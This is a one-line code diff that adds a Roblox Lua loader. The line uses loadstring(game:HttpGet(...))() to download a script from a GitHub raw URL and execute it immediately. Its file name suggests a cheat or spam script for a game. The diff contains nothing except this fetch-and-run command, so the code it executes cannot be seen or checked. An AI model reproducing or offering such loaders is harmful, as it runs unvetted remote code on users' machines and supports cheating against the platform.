@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/drill-to-earth-s-core-spam5-w6ix2ai3m6fzr4.lua"))()
